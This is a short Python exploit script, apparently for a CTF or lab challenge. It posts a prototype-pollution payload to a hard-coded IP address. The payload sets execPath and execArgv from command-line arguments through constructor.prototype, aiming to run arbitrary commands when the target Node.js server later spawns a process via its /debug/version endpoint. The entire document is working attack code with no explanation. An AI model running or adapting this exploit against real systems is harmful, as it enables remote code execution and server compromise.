import json
import requests
import sys
import collections
url = "http://138.68.131.49:30954"
pollution = {
    "constructor": {
        "prototype": collections.OrderedDict([
            ("execPath", sys.argv[1]),
            ("execArgv", sys.argv[2:])
        ])
    }
}
requests.session().post(f"{url}/api/calculate", json=pollution)
print((requests.session().get(f'{url}/debug/version').text))
